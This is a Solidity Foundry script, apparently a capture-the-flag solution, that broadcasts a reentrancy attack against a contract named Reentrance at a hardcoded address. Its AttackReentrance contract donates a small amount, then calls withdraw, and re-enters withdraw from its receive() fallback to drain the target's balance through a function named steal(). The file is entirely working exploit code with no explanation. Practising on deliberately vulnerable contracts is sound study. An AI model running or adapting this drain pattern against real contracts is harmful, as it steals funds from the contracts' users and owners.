// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {Script, console} from "../lib/forge-std/src/Script.sol";
import {Reentrance} from "../src/Reentrance.sol";

contract ReentranceScript is Script {
    Reentrance public reentrance;
    AttackReentrance public attackReentrance;

    function run() public {
        reentrance = Reentrance(0xb388977426409c3c24433272ceba598B3358DdC0);
        attack();
    }

    function attack() public {
        vm.startBroadcast();
        attackReentrance = new AttackReentrance(
            0xb388977426409c3c24433272ceba598B3358DdC0
        );
        attackReentrance.fund{value: 0.0001 ether}();
        attackReentrance.steal();
        vm.stopBroadcast();
    }
}

contract AttackReentrance {
    Reentrance public reentrance;

    constructor(address payable reentranceContractInstance) public {
        reentrance = Reentrance(reentranceContractInstance);
    }

    function fund() public payable {}

    function steal() public {
        reentrance.donate{value: 0.0001 ether}(address(this));
        reentrance.withdraw(0.0001 ether);
    }

    receive() external payable {
        reentrance.withdraw(0.0001 ether);
    }
}
